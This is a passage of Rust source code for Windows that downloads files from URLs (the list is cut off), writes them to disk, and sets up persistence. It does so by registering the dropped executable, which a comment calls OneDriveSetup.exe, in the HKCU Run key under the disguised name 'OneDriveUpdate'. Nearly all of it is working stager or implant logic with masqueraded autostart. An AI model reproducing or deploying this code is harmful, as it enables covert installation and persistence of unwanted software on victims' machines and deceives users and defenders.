        ),

    ];

    for (url, output_path) in files.iter() {
        println!("Downloading file: {}\n", url);

        // Download file
        let output_data = download_file(url)?;
        println!("Downloaded {} bytes successfully\n", output_data.len());
        println!("Creating output file: {}\n", output_path);

        // Create output file
        let output_path_w: Vec<u16> = OsString::from(output_path)
            .encode_wide()
            .chain(std::iter::once(0))
            .collect();

        let file_handle = unsafe {
            CreateFileW(
                PCWSTR(output_path_w.as_ptr()),
                0x40000000, // GENERIC_WRITE
                FILE_SHARE_MODE(0),
                Some(null()),
                CREATE_ALWAYS,
                FILE_FLAGS_AND_ATTRIBUTES(0),
                None,
            )
        }.map_err(|e| {
            let err = NTError::Win32Error {
                error: e,
                context: "main: CreateFileW".to_string(),
            };
            println!("{}", err);
            err
        })?;

        if file_handle.is_invalid() {
            unsafe { CloseHandle(file_handle).unwrap() };
            let err = NTError::InvalidParameter {
                message: "Invalid file handle created".to_string(),
                context: "main: CreateFileW".to_string(),
            };
            println!("{}", err);
            return Err(err);
        }

        // Write output data
        let mut bytes_written = 0;
        
        unsafe {
            WriteFile(
                file_handle,
                Some(output_data.as_slice()),
                Some(&mut bytes_written),
                None,
            )
        }.map_err(|e: Error| {
            let err = NTError::Win32Error {
                error: e,
                context: "main: WriteFile".to_string(),
            };
            println!("{}", err);
            err
        })?;


        println!("Successfully wrote {} to disk\n", output_path);
    }

    // Set up persistence for 
    let key_path = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    let value_name = "OneDriveUpdate";
    // let value_name = "MsgBox";
    
    let exe_path = files[0].1.clone(); // Path to OneDriveSetup.exe

    let wide_exe: Vec<u16> = OsString::from(exe_path)
        .encode_wide()
        .chain(std::iter::once(0))
        .collect();
    let wide_key: Vec<u16> = OsString::from(key_path)
        .encode_wide()
        .chain(std::iter::once(0))
        .collect();
    let wide_value: Vec<u16> = OsString::from(value_name)
        .encode_wide()
        .chain(std::iter::once(0))
        .collect();

    let mut hkey: HKEY = HKEY(null_mut());
        
    unsafe {
        RegOpenKeyExW(
            HKEY_CURRENT_USER,
            PCWSTR(wide_key.as_ptr()),
            Some(0),
            KEY_SET_VALUE,
            &mut hkey,
        )
    }.0;

    unsafe {
        RegSetValueExW(
            hkey,
            PCWSTR(wide_value.as_ptr()),
            Some(0),
            REG_SZ,
            Some(std::slice::from_raw_parts(
                wide_exe.as_ptr() as *const u8,
                wide_exe.len() * std::mem::size_of::<u16>(),
            )),
        )
    }.0;

    unsafe { RegCloseKey(hkey).0 };

    println!("Successfully set registry value for persistence");

    

    println!("Finished\n");

    Ok(())
}
